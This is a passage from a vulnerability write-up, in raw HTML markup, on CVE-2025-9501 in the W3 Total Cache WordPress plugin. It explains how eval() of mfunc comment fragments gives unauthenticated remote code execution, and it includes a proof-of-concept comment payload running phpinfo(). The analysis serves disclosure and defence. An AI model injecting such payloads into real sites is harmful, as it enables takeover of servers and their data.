class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dynamic content format:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;mfunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY_VALUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mfunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY_VALUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;or&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;mclude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY_VALUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mclude&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY_VALUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If no dynamic content → return buffer directly to cache.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If dynamic content:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Save full HTML to &lt;code&gt;_shutdown_buffer&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Return empty string temporarily&lt;/li&gt;&#xA;&lt;li&gt;Register &lt;code&gt;shutdown()&lt;/code&gt; to process after PHP request finishes&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;shutdown&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$compression&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_page_key_extension&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;compression&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_parse_dynamic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_shutdown_buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$compressed_buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_compress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$compression&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$compressed_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;shutdown()&lt;/code&gt; calls &lt;code&gt;_parse_dynamic()&lt;/code&gt; to process dynamic HTML blocks and replace them with executed results:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;_parse_dynamic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_replace_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;lt;!--\s*mfunc\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mfunc\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\s*--&amp;gt;~Uis&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_parse_dynamic_mfunc&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_replace_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;lt;!--\s*mclude\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mclude\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\s*--&amp;gt;~Uis&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_parse_dynamic_mclude&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Each matched block is replaced by the executed content, ready for compression and output.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;User&amp;ensp;requests&amp;ensp;any&amp;ensp;front‑end&amp;ensp;page&amp;ensp;(unauthenticated)&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;WordPress&amp;ensp;loads&amp;ensp;wp-settings.php&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;WP_CACHE&amp;ensp;=&amp;ensp;true&amp;ensp;→&amp;ensp;Load&amp;ensp;advanced-cache.php&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;advanced-cache.php&amp;ensp;runs&amp;ensp;Dispatcher&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;PgCache_ContentGrabber-&gt;process()&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;Util_Bus::add_ob_callback(&#39;pagecache&#39;,&amp;ensp;&#39;ob_callback&#39;)&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;WordPress&amp;ensp;renders&amp;ensp;full&amp;ensp;HTML&amp;ensp;into&amp;ensp;output&amp;ensp;buffer&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H[&#34;ob_callback($buffer)&amp;ensp;triggered&#34;]&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I{&#34;_has_dynamic($buffer)&amp;ensp;?&#34;}&#xD;&#xA;I&amp;ensp;--&gt;|No|&amp;ensp;J[&#34;Return&amp;ensp;buffer&amp;ensp;as-is&amp;ensp;→&amp;ensp;Serve&amp;ensp;cached&amp;ensp;page&#34;]&#xD;&#xA;I&amp;ensp;--&gt;|Yes|&amp;ensp;K[&#34;Save&amp;ensp;buffer&amp;ensp;to&amp;ensp;_shutdown_buffer&#34;]&#xD;&#xA;K&amp;ensp;--&gt;&amp;ensp;L[&#34;register_shutdown_function(shutdown)&#34;]&#xD;&#xA;L&amp;ensp;--&gt;&amp;ensp;M[&#34;After&amp;ensp;request&amp;ensp;completes&amp;ensp;→&amp;ensp;shutdown()&#34;]&#xD;&#xA;M&amp;ensp;--&gt;&amp;ensp;N[&#34;_parse_dynamic(_shutdown_buffer)&#34;]&#xD;&#xA;N&amp;ensp;--&gt;&amp;ensp;O{&#34;HTML&amp;ensp;contains&amp;ensp;&lt;!--&amp;ensp;mfunc&amp;ensp;...&amp;ensp;--&gt;&amp;ensp;?&#34;}&#xD;&#xA;O&amp;ensp;--&gt;|Yes|&amp;ensp;P[&#34;_parse_dynamic_mfunc()&#34;]&#xD;&#xA;P&amp;ensp;--&gt;&amp;ensp;Q[&#34;Extract&amp;ensp;payload&amp;ensp;from&amp;ensp;comment&amp;ensp;and&amp;ensp;run&amp;ensp;eval()&#34;]&#xD;&#xA;O&amp;ensp;--&gt;|Or&amp;ensp;mclude|&amp;ensp;R[&#34;_parse_dynamic_mclude()&amp;ensp;(include&amp;ensp;type)&#34;]&#xD;&#xA;Q&amp;ensp;--&gt;&amp;ensp;S[&#34;Output&amp;ensp;replaced&amp;ensp;with&amp;ensp;execution&amp;ensp;result&#34;]&#xD;&#xA;R&amp;ensp;--&gt;&amp;ensp;S&#xD;&#xA;S&amp;ensp;--&gt;&amp;ensp;T[&#34;Page&amp;ensp;optionally&amp;ensp;compressed&#34;]&#xD;&#xA;T&amp;ensp;--&gt;&amp;ensp;U[&#34;echo&amp;ensp;back&amp;ensp;to&amp;ensp;user&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Install and activate the plugin.&lt;/li&gt;&#xA;&lt;li&gt;Enable Page Cache.&lt;/li&gt;&#xA;&lt;li&gt;Configure &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; in &lt;code&gt;wp-config.php&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Comment on any post:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;mfuncvalue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mfuncvalue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#39; alt=&#34;Result&#34; height=&#34;1078&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;&#xA;The value of &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; may be exposed if you forget to enable Page Cache and use it in a place where an Unauthenticated User can see it.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; title=&#34;Used when Page Cache is forgotten to be enabled&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Miss Page Cache&lt;/h2&gt;&lt;p&gt;Used when Page Cache is forgotten to be enabled&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#39; alt=&#34;Miss Page Cache&#34; height=&#34;259&#34; width=&#34;427&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Used when Page Cache is forgotten to be enabled&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-9501 arises because W3 Total Cache executes PHP in “dynamic fragment caching” (&lt;code&gt;&amp;lt;!--&amp;ensp;mfunc&amp;ensp;...&amp;ensp;--&amp;gt;&lt;/code&gt;) via &lt;code&gt;eval()&lt;/code&gt; without any validation or sandboxing. This allows unauthenticated attackers to inject PHP code that runs during &lt;code&gt;shutdown()&lt;/code&gt;, after WordPress completes the main request, leading to Remote Code Execution (RCE). The risk is heightened because cache and output handling occur outside normal WordPress lifecycle, bypassing hooks, nonces, and access checks. Version 2.8.13 removes the &lt;code&gt;eval()&lt;/code&gt; call, fixing the vulnerability.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Using &lt;code&gt;eval()&lt;/code&gt; in production code almost always results in RCE if input is uncontrolled.&lt;/li&gt;&#xA;&lt;li&gt;The plugin processes dynamic content &lt;strong&gt;after the full WordPress lifecycle&lt;/strong&gt;, bypassing many core protections.&lt;/li&gt;&#xA;&lt;li&gt;W3TC Page Fragment Caching allows PHP execution from HTML comments; misconfiguration or missing validation enables attacks.&lt;/li&gt;&#xA;&lt;li&gt;RCE triggers in &lt;code&gt;register_shutdown_function()&lt;/code&gt;, executing at the end of the request, making detection 